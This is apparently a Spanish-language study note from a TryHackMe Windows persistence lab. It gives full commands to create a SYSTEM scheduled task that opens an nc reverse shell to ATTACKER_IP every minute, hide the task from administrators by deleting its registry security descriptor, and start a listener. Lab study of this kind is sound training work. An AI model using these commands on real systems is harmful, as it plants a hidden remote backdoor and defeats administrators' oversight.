---
tags: [red-team, persistence, windows, scheduled-tasks]
created: 2026-04-20
source: TryHackMe - Windows Local Persistence
related:
  - "[[Abusing Services]]"
  - "[[Logon Triggered Persistence]]"
---

Las tareas programadas permiten ejecutar payloads de forma periódica o ante eventos específicos del sistema.

---

## Task Scheduler

Crear una tarea que ejecute una reverse shell cada minuto:

```shell
schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe ATTACKER_IP 4449" /ru SYSTEM
```

| Flag | Función |
|------|---------|
| `/sc minute` | Frecuencia: cada minuto |
| `/mo 1` | Modificador: cada 1 minuto |
| `/tn` | Nombre de la tarea |
| `/tr` | Comando a ejecutar |
| `/ru SYSTEM` | Ejecutar como SYSTEM |

Verificar creación:

```shell
schtasks /query /tn THM-TaskBackdoor
```

---

## Hacer la tarea invisible

Si el usuario lista sus tareas programadas, nuestro backdoor será visible. Para ocultarlo, eliminamos su **Security Descriptor (SD)**.

> [!info] El SD es una ACL que define qué usuarios pueden ver/interactuar con la tarea. Sin SD, ningún usuario puede verla (ni siquiera administradores).

Los SD se almacenan en:
`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\`

### Proceso

1. Abrir Regedit como SYSTEM:

```shell
c:\tools\pstools\PsExec64.exe -s -i regedit
```

2. Navegar a la key de la tarea y **eliminar el valor SD**.

3. Verificar que ya no es visible:

```shell
schtasks /query /tn THM-TaskBackdoor
```

Resultado esperado: `ERROR: The system cannot find the file specified.`

4. Listener:

```shell
nc -lvp 4449
```

